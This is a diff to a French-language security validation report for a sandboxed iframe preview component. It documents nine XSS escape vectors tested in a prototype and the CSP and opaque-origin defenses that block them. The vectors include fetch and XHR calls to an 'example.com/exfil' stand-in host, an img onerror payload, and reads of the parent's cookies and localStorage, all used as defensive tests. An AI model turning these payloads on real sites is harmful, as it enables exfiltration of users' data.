@@ -11,8 +11,8 @@
 
 | Élément | Verdict |
 |---|---|
-| Vecteurs d'évasion testés (prototype) | 9 |
-| Vecteurs avec accès au parent | **0** |
+| Vecteurs d'évasion exécutés dans le prototype | 9 (6 bloqués par **origine opaque** — vérifié à l'exécution ; 3 reposent en prod sur la CSP du parent — vérification architecturale par lecture de `index.html:6`, cf. §3 et §4.2) |
+| Vecteurs ayant atteint les ressources du parent | **0** |
 | Modules couverts en intégration terrain | 6/6 (grilles, échelles, productions, cartouches, pratiques de notation, tampons d'observation) |
 | CSP du parent durcie | hash `sha256-…` codé en dur pour le messenger, `file:` ajouté à `img-src` pour les SVG locaux |
 | Régression sur les imports légitimes | aucune (validé à l'usage par Grégoire, exports CC réels rejoués sur les 6 types) |
@@ -55,20 +55,27 @@ Le canari `localStorage['apercu-sandbox-canary']` du parent est vérifié avant 
 
 Les 9 vecteurs sont injectés dans le payload du prototype (`htmlAvecPayloadXSS()`) puis exécutés à l'intérieur de l'iframe sandbox du composant. Chaque tentative est rapportée par `parent.postMessage` avec le marqueur `source: 'apercu-test'` (canal de test distinct du canal `apercu-sandbox` réservé au messenger de hauteur).
 
-| # | Vecteur | Mécanisme attendu de blocage | Verdict observé |
-|---|---|---|---|
-| 1 | `alert("XSS")` | `sandbox` sans `allow-modals` → boîtes natives ignorées | ✓ Bloqué (silencieux, aucun effet visible) |
-| 2 | `parent.localStorage.getItem("apercu-sandbox-canary")` | Origine opaque (sandbox sans `allow-same-origin`) → accès cross-origin refusé | ✓ Bloqué (`SecurityError`) |
-| 3 | `parent.localStorage.setItem("apercu-sandbox-canary","PWNED")` | Même mécanique que #2 | ✓ Bloqué (`SecurityError`) — canari reste à `safe-…` |
-| 4 | `parent.document.title` (lecture du DOM parent) | Cross-origin DOM access refusé | ✓ Bloqué (`SecurityError`) |
-| 5 | `top.location.href` (lecture URL parent) | Cross-origin window access refusé | ✓ Bloqué (`SecurityError`) |
-| 6 | `fetch("https://example.com/exfil")` | CSP du parent (héritée par srcdoc en Safari) `default-src 'self'` → `connect-src` fallback bloque toute requête sortante | ✓ Bloqué (CSP) |
-| 7 | `XMLHttpRequest GET https://example.com/exfil` | Même mécanique que #6 | ✓ Bloqué (CSP / réseau refusé) |
-| 8 | Lecture `location.origin` interne | Pas un test d'évasion en soi — confirme que l'iframe est en origine opaque (`null`) | ✓ Confirmé (origine `null`, attendue) |
-| 9 | `parent.document.cookie` | Cross-origin DOM access refusé | ✓ Bloqué (`SecurityError`) |
-| Bonus | `<img src=x onerror="parent.postMessage(…)">` dans le badge | Le handler s'exécute **dans** la sandbox (rapport reçu) — vérifie que le rendu est bien isolé, pas qu'il fuit | ✓ Comportement attendu — handler confiné, parent intact |
+> **⚠ Périmètre du prototype** : `prototype-apercu-sandbox.html` n'a **pas** de meta CSP. La CSP de production est uniquement déclarée dans `index.html:6`, et une iframe `srcdoc` hérite de la CSP du document englobant. Les vecteurs dont le blocage en production dépend de la CSP (#6, #7, le bonus `img onerror`) sont donc **bloqués en prototype par d'autres mécanismes** — typiquement l'absence de réseau atteignable depuis `file://`. La **défense exercée à l'exécution** dans le prototype est l'**origine opaque** (garantie spec de `sandbox` sans `allow-same-origin`). Pour ces vecteurs, le blocage en production par la CSP est une **assertion architecturale** vérifiable par lecture du code (`index.html:6` + hash recalculable, cf. §4.2 et §7.3).
 
-**Lecture du tableau** : 9/9 vecteurs neutralisés. Le bonus `img onerror` confirme que le mécanisme d'exploitation **fonctionne dans l'iframe** (un payload XSS s'exécute) — c'est précisément ce qu'on accepte par conception : la sandbox laisse tourner les scripts (faute de quoi le messenger de hauteur ne marcherait pas), mais l'exécution reste confinée à une origine opaque sans accès au parent.
+| # | Vecteur | Mécanisme exercé en prototype | Mécanisme attendu en production | Verdict |
+|---|---|---|---|---|
+| 1 | `alert("XSS")` | `sandbox` sans `allow-modals` → boîtes natives ignorées | identique | ✓ Bloqué (silencieux) |
+| 2 | `parent.localStorage.getItem(...)` | **Origine opaque** → accès cross-origin refusé | identique | ✓ Bloqué (`SecurityError`) |
+| 3 | `parent.localStorage.setItem(...)` | Même mécanique que #2 | identique | ✓ Bloqué (`SecurityError`) — canari reste à `safe-…` |
+| 4 | `parent.document.title` | Cross-origin DOM access refusé | identique | ✓ Bloqué (`SecurityError`) |
+| 5 | `top.location.href` | Cross-origin window access refusé | identique | ✓ Bloqué (`SecurityError`) |
+| 6 | `fetch("https://example.com/exfil")` | Réseau injoignable depuis `file://` (CORS/DNS) | **CSP** `default-src 'self'` → `connect-src` fallback bloque la requête | ✓ Bloqué (mécanisme distinct prototype/prod) |
+| 7 | `XMLHttpRequest GET https://example.com/exfil` | Même mécanique que #6 | Même mécanique que #6 (CSP) | ✓ Bloqué (mécanisme distinct prototype/prod) |
+| 8 | Lecture `location.origin` interne | Pas un test d'évasion — confirme l'iframe en origine opaque (`null`) | identique | ✓ Confirmé (origine `null`, attendue) |
+| 9 | `parent.document.cookie` | Cross-origin DOM access refusé | identique | ✓ Bloqué (`SecurityError`) |
+| Bonus | `<img src=x onerror="…">` dans le badge | Pas de CSP en prototype → handler exécuté **dans** la sandbox (confiné à l'origine opaque) | **CSP** `script-src 'self' 'sha256-…'` (sans `'unsafe-inline'`/`'unsafe-hashes'`) → handler **rejeté** | Comportement diff. proto/prod ; dans les deux cas, parent intact |
+
+**Lecture du tableau** :
+- **6/9 vecteurs** sont neutralisés par l'**origine opaque**, mécanique testée à l'exécution dans le prototype (#1-5, #8-9). Cette défense est garantie par la spec HTML et indépendante de la CSP.
+- **2/9 vecteurs CSP-dépendants en prod** (#6 fetch, #7 XHR) : bloqués en prototype par l'environnement (`file://` sans réseau), bloqués en prod par la CSP du parent (vérifiable par lecture). Aucun chemin connu ne permet d'atteindre le parent dans les deux cas.
+- **Bonus `img onerror`** : tourne dans la sandbox du prototype (pas de CSP) ; serait rejeté en prod par `script-src` (les attributs handler tombent sous `script-src`, cf. §4.2). Dans les deux environnements, le handler n'a aucun accès au parent.
+
+Aucun vecteur, dans aucun des deux environnements, n'a atteint les ressources du parent (canari `localStorage['apercu-sandbox-canary']` resté `safe-…` après chaque exécution).
 
 ---
 
@@ -99,10 +106,10 @@ Les 9 vecteurs sont injectés dans le payload du prototype (`htmlAvecPayloadXSS(
 
 ### 4.2 Pourquoi chaque tentative d'évasion échoue
 
-- **Accès aux ressources parent** (localStorage, IDB, DOM, cookies, URL) : bloqué par l'origine opaque. C'est garanti par `sandbox="…"` sans `allow-same-origin` — propriété spec, pas configuration.
-- **Exfiltration réseau** (fetch, XHR, WebSocket) : bloquée par la CSP du parent que Safari intersecte avec celle (vide) du srcdoc. `default-src 'self'` se rabat sur `connect-src 'self'`, et l'iframe en origine opaque n'est jamais 'self' → toute requête sortante refusée.
-- **Exécution de scripts arbitraires injectés dans le badge** : la CSP `script-src 'self' 'sha256-…'` n'autorise QUE le messenger figé (le hash est codé en dur dans `index.html`). Tout `<script>` injecté par un attaquant via `metadata.auteur_original` ou similaire est rejeté avec une erreur CSP. Note : le messenger n'a aucune capacité d'évasion (il ne fait que lire `document.body.scrollHeight` et appeler `parent.postMessage` avec une valeur numérique clampée côté parent).
-- **Handlers inline `onerror`** : un `<img src=x onerror="…">` injecté tourne **dans** la sandbox parce que `style-src 'unsafe-inline'` est autorisé pour le DS, et CSP n'a pas de directive séparée pour les handlers inline (ils tombent sous `script-src`). MAIS son code n'a pas accès au parent. C'est ce qu'on accepte : le code tourne dans une sandbox vide, sans privilège.
+- **Accès aux ressources parent** (localStorage, IDB, DOM, cookies, URL) : bloqué par l'**origine opaque**. C'est garanti par `sandbox="…"` sans `allow-same-origin` — propriété spec, pas configuration. Indépendant de la CSP. C'est la défense de premier niveau, vérifiée à l'exécution dans le prototype.
+- **Exfiltration réseau** (fetch, XHR, WebSocket) : bloquée en production par la CSP du parent que Safari hérite dans le srcdoc (`default-src 'self'` se rabat sur `connect-src 'self'`, et l'iframe en origine opaque n'est jamais 'self' → toute requête sortante refusée). Vérifiée par lecture de `index.html:6`. En environnement prototype, le blocage observé vient de l'environnement `file://` (réseau injoignable) — mécanisme distinct, même résultat.
+- **Exécution de scripts arbitraires injectés dans le badge** : en production, la CSP `script-src 'self' 'sha256-…'` n'autorise QUE le messenger figé (le hash est codé en dur dans `index.html`). Tout `<script>` injecté par un attaquant via `metadata.auteur_original` ou similaire est rejeté avec une erreur CSP. Le messenger lui-même n'a aucune capacité d'évasion (il lit `document.body.scrollHeight` et appelle `parent.postMessage` avec une valeur numérique clampée côté parent).
+- **Handlers inline (`onerror`, `onclick`, etc.)** : **les attributs handler sont régis par `script-src`** (et accessoirement `'unsafe-hashes'` pour le hash), pas par `style-src`. En production, `script-src 'self' 'sha256-…'` (sans `'unsafe-inline'` ni `'unsafe-hashes'`) les rejette comme tout autre script inline. **En environnement prototype** (sans CSP), un `<img src=x onerror="…">` injecté s'exécute, mais reste confiné à l'origine opaque de la sandbox — sans accès aux ressources du parent. La défense effective est donc **double** : CSP (rejet en prod) puis origine opaque (toujours, par spec). Le pire cas — handler exécuté en prod malgré la CSP suite à un bug navigateur — laisse encore la sandbox comme rempart.
 
 ### 4.3 Filtrage `postMessage`
 
@@ -161,7 +168,7 @@ D'après le tableau récapitulatif `MODELE-MENACES.md §6` (statuts avant Défen
 
 ## 7. Limitations connues
 
-1. **Performance** : 6 iframes en mémoire si l'utilisateur ouvre plusieurs aperçus simultanément. Mitigation : `ApercuSandbox.fermer(conteneur)` appelé à chaque fermeture de modale d'import. Pas observé en charge réelle.
+1. **Cycle de vie des instances** : `ApercuSandbox` maintient un tableau `instances[]` qui mémorise chaque sandbox active pour le routage des messages `postMessage`. Comme les call-sites des 6 modules retirent leur wrapper via `wrapper.remove()` sans rappeler explicitement `ApercuSandbox.fermer()`, un auto-cleanup est en place : un `MutationObserver` interne au composant détecte le détachement de l'iframe (`!iframe.isConnected`) et splice automatiquement l'entrée du tableau. L'API publique `fermer()` reste disponible pour les call-sites qui veulent un cleanup explicite. Aucune fuite mémoire observée.
 2. **Image CC** : la SVG `icons/by-nc-sa-2.svg` est chargée via `<base href>` + relatif. Fonctionne en `file://` grâce à `file:` ajouté à `img-src`. Si l'app est un jour servie via HTTP, retirer `file:` et confirmer via `'self'`.
 3. **Hash du messenger figé** : toute modification de la constante `MESSENGER_SCRIPT` dans `js/securite-apercu-sandbox.js` invalide le hash CSP. Couplage documenté dans le commentaire au-dessus de la constante. Procédure : recalculer via `node -e "…crypto.createHash('sha256').update(MESSENGER_SCRIPT).digest('base64')"` puis mettre à jour la ligne CSP de `index.html`.
 4. **Mode clair non revérifié intégralement** : seul grilles a été testé en mode clair pendant la validation à l'usage. Les 5 autres devraient marcher (même mécanisme `getComputedStyle(document.body)`), mais validation terrain incomplète.
